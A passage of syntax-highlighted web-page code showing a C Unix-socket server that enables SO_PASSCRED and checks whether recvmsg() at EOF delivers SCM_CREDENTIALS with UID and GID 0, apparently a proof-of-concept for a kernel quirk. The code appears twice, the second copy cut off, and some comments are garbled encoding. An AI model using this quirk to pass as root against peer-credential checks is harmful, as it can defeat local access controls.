style="color:#999999"> =</span><span style="color:#393A34"> iov</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    msg</span><span style="color:#999999">.</span><span style="color:#B07D48">msg_iovlen</span><span style="color:#999999"> =</span><span style="color:#2F798A"> 1</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">    char</span><span style="color:#B07D48"> cmsg_buf</span><span style="color:#1e754f">[</span><span style="color:#59873A">CMSG_SPACE</span><span style="color:#a65e2b">(</span><span style="color:#AB5959">sizeof</span><span style="color:#a13865">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> ucred</span><span style="color:#a13865">)</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">]</span><span style="color:#999999"> =</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><span style="color:#2F798A">0</span><span style="color:#1e754f">}</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    msg</span><span style="color:#999999">.</span><span style="color:#B07D48">msg_control</span><span style="color:#999999"> =</span><span style="color:#393A34"> cmsg_buf</span><span style="color:#999999">;</span><br><span style="color:#B07D48">    msg</span><span style="color:#999999">.</span><span style="color:#B07D48">msg_controllen</span><span style="color:#999999"> =</span><span style="color:#AB5959"> sizeof</span><span style="color:#1e754f">(</span><span style="color:#393A34">cmsg_buf</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Waiting for recvmsg()...</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    ssize_t</span><span style="color:#393A34"> n </span><span style="color:#999999">=</span><span style="color:#59873A"> recvmsg</span><span style="color:#1e754f">(</span><span style="color:#393A34">client_fd</span><span style="color:#999999">,</span><span style="color:#AB5959"> &#x26;</span><span style="color:#393A34">msg</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">n </span><span style="color:#AB5959">==</span><span style="color:#AB5959"> -</span><span style="color:#2F798A">1</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        perror</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">recvmsg</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    printf</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">recvmsg() returned </span><span style="color:#A65E2B">%zd</span><span style="color:#B56959"> (EOF)</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> n</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><br><span style="color:#AB5959">    struct</span><span style="color:#393A34"> cmsghdr </span><span style="color:#AB5959">*</span><span style="color:#393A34">cmsg </span><span style="color:#999999">=</span><span style="color:#59873A"> CMSG_FIRSTHDR</span><span style="color:#1e754f">(</span><span style="color:#AB5959">&#x26;</span><span style="color:#393A34">msg</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">cmsg </span><span style="color:#AB5959">==</span><span style="color:#1E754F"> NULL</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">No control message (cmsg) received.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        exit</span><span style="color:#a65e2b">(</span><span style="color:#393A34">EXIT_FAILURE</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#B07D48">cmsg</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">cmsg_level</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> SOL_SOCKET </span><span style="color:#AB5959">&#x26;&#x26;</span><span style="color:#B07D48"> cmsg</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">cmsg_type</span><span style="color:#AB5959"> ==</span><span style="color:#393A34"> SCM_CREDENTIALS</span><span style="color:#1e754f">)</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Received SCM_CREDENTIALS.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">        struct</span><span style="color:#393A34"> ucred </span><span style="color:#AB5959">*</span><span style="color:#393A34">creds </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#AB5959">struct</span><span style="color:#393A34"> ucred </span><span style="color:#AB5959">*</span><span style="color:#a65e2b">)</span><span style="color:#59873A">CMSG_DATA</span><span style="color:#a65e2b">(</span><span style="color:#393A34">cmsg</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">----------------------------------</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">  PID: </span><span style="color:#A65E2B">%d\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> creds</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">pid</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">  UID: </span><span style="color:#A65E2B">%u\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">unsigned</span><span style="color:#AB5959"> int</span><span style="color:#a13865">)</span><span style="color:#B07D48">creds</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">uid</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> /* ä¿®æ­£ï¼šä½¿ç”¨ %u æ‰“å° uid_t */</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">  GID: </span><span style="color:#A65E2B">%u\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#AB5959">unsigned</span><span style="color:#AB5959"> int</span><span style="color:#a13865">)</span><span style="color:#B07D48">creds</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">gid</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> /* ä¿®æ­£ï¼šä½¿ç”¨ %u æ‰“å° gid_t */</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">----------------------------------</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><br><span style="color:#1E754F">        if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#B07D48">creds</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">uid</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959"> &#x26;&#x26;</span><span style="color:#B07D48"> creds</span><span style="color:#999999">-</span><span style="color:#999999">></span><span style="color:#B07D48">gid</span><span style="color:#AB5959"> ==</span><span style="color:#2F798A"> 0</span><span style="color:#a65e2b">)</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#59873A">            printf</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">SUCCESS: Kernel quirk verified! Received null credentials.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">}</span><span style="color:#1E754F"> else</span><span style="color:#999999"> </span><span style="color:#a65e2b">{</span><br><span style="color:#59873A">            printf</span><span style="color:#a13865">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">FAILURE: Received non-null credentials.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">        </span><span style="color:#a65e2b">}</span><br><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#1E754F"> else</span><span style="color:#999999"> </span><span style="color:#1e754f">{</span><br><span style="color:#59873A">        printf</span><span style="color:#a65e2b">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">Received an unknown control message.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><br><br><span style="color:#59873A">    close</span><span style="color:#1e754f">(</span><span style="color:#393A34">client_fd</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    close</span><span style="color:#1e754f">(</span><span style="color:#393A34">server_fd</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">    unlink</span><span style="color:#1e754f">(</span><span style="color:#393A34">SOCKET_PATH</span><span style="color:#1e754f">)</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    return</span><span style="color:#2F798A"> 0</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-c language-c"><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> _GNU_SOURCE</span><br><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdio.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">stdlib.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">string.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">unistd.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">sys/socket.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">sys/un.h</span><span style="color:#C98A7D77">></span><br><span style="color:#666666">#</span><span style="color:#4D9375">include</span><span style="color:#C98A7D77"> &#x3C;</span><span style="color:#C98A7D">sys/types.h</span><span style="color:#C98A7D77">></span><br><br><span style="color:#666666">#</span><span style="color:#4D9375">define</span><span style="color:#80A665"> SOCKET_PATH</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">shutdown_quirk.sock</span><span style="color:#C98A7D77">"</span><br><br><span style="color:#CB7676">int</span><span style="color:#80A665"> main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666"> </span><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> server_fd</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> client_fd</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> sockaddr_un server_addr</span><span style="color:#666666">;</span><br><br><span style="color:#DBD7CAEE">    server_fd </span><span style="color:#666666">=</span><span style="color:#80A665"> socket</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">AF_UNIX</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOCK_STREAM</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">server_fd </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">socket</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    unlink</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">SOCKET_PATH</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">    memset</span><span style="color:#4d9375">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">server_addr</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d4976c">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr_un</span><span style="color:#d4976c">)</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    server_addr</span><span style="color:#666666">.</span><span style="color:#BD976A">sun_family</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> AF_UNIX</span><span style="color:#666666">;</span><br><span style="color:#80A665">    strncpy</span><span style="color:#4d9375">(</span><span style="color:#BD976A">server_addr</span><span style="color:#666666">.</span><span style="color:#BD976A">sun_path</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOCKET_PATH</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d4976c">(</span><span style="color:#BD976A">server_addr</span><span style="color:#666666">.</span><span style="color:#BD976A">sun_path</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">bind</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">server_fd</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr </span><span style="color:#CB7676">*</span><span style="color:#d9739f">)</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">server_addr</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d9739f">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> sockaddr_un</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">bind</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">listen</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">server_fd</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 5</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">listen</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Server listening on </span><span style="color:#C99076">%s\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOCKET_PATH</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#DBD7CAEE">    client_fd </span><span style="color:#666666">=</span><span style="color:#80A665"> accept</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">server_fd</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#666666">,</span><span style="color:#4D9375"> NULL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">client_fd </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">accept</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Client connected.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">    int</span><span style="color:#DBD7CAEE"> enable </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#80A665">setsockopt</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SOL_SOCKET</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> SO_PASSCRED</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">enable</span><span style="color:#666666">,</span><span style="color:#CB7676"> sizeof</span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE">enable</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#CB7676"> ==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">setsockopt(SO_PASSCRED)</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">SO_PASSCRED enabled.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> msghdr msg </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">}</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> iovec </span><span style="color:#BD976A">iov</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">}</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    char</span><span style="color:#BD976A"> buf</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">;</span><br><br><span style="color:#BD976A">    iov</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">.</span><span style="color:#BD976A">iov_base</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> buf</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    iov</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">.</span><span style="color:#BD976A">iov_len</span><span style="color:#666666"> =</span><span style="color:#CB7676"> sizeof</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    msg</span><span style="color:#666666">.</span><span style="color:#BD976A">msg_iov</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> iov</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    msg</span><span style="color:#666666">.</span><span style="color:#BD976A">msg_iovlen</span><span style="color:#666666"> =</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">    char</span><span style="color:#BD976A"> cmsg_buf</span><span style="color:#4d9375">[</span><span style="color:#80A665">CMSG_SPACE</span><span style="color:#d4976c">(</span><span style="color:#CB7676">sizeof</span><span style="color:#d9739f">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> ucred</span><span style="color:#d9739f">)</span><span style="color:#d4976c">)</span><span style="color:#4d9375">]</span><span style="color:#666666"> =</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">}</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    msg</span><span style="color:#666666">.</span><span style="color:#BD976A">msg_control</span><span style="color:#666666"> =</span><span style="color:#DBD7CAEE"> cmsg_buf</span><span style="color:#666666">;</span><br><span style="color:#BD976A">    msg</span><span style="color:#666666">.</span><span style="color:#BD976A">msg_controllen</span><span style="color:#666666"> =</span><span style="color:#CB7676"> sizeof</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">cmsg_buf</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Waiting for recvmsg()...</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">    ssize_t</span><span style="color:#DBD7CAEE"> n </span><span style="color:#666666">=</span><span style="color:#80A665"> recvmsg</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">client_fd</span><span style="color:#666666">,</span><span style="color:#CB7676"> &#x26;</span><span style="color:#DBD7CAEE">msg</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">n </span><span style="color:#CB7676">==</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        perror</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">recvmsg</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#80A665">    printf</span><span style="color:#4d9375">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">recvmsg() returned </span><span style="color:#C99076">%zd</span><span style="color:#C98A7D"> (EOF)</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> n</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><br><span style="color:#CB7676">    struct</span><span style="color:#DBD7CAEE"> cmsghdr </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">cmsg </span><span style="color:#666666">=</span><span style="color:#80A665"> CMSG_FIRSTHDR</span><span style="color:#4d9375">(</span><span style="color:#CB7676">&#x26;</span><span style="color:#DBD7CAEE">msg</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">cmsg </span><span style="color:#CB7676">==</span><span style="color:#4D9375"> NULL</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">No control message (cmsg) received.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        exit</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">EXIT_FAILURE</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#4d9375">}</span><br><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#BD976A">cmsg</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">cmsg_level</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> SOL_SOCKET </span><span style="color:#CB7676">&#x26;&#x26;</span><span style="color:#BD976A"> cmsg</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">cmsg_type</span><span style="color:#CB7676"> ==</span><span style="color:#DBD7CAEE"> SCM_CREDENTIALS</span><span style="color:#4d9375">)</span><span style="color:#666666"> </span><span style="color:#4d9375">{</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Received SCM_CREDENTIALS.</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#CB7676">        struct</span><span style="color:#DBD7CAEE"> ucred </span><span style="color:#CB7676">*</span><span style="color:#DBD7CAEE">creds </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#CB7676">struct</span><span style="color:#DBD7CAEE"> ucred </span><span style="color:#CB7676">*</span><span style="color:#d4976c">)</span><span style="color:#80A665">CMSG_DATA</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">cmsg</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">----------------------------------</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">  PID: </span><span style="color:#C99076">%d\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> creds</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">pid</span><span style="color:#d4976c">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">        printf</span><span style="color:#d4976c">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">  UID: </span><span style="color:#C99076">%u\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#CB7676">unsigned</span><span style="color:#CB7676"> int</span><span style="color:#d9739f">)</span><span style="color:#BD976A">creds</span><span style="color:#666666">-</span><span style="color:#666666">></span><span style="color:#BD976A">uid</span><span style="color:#d4976c">)</span><span 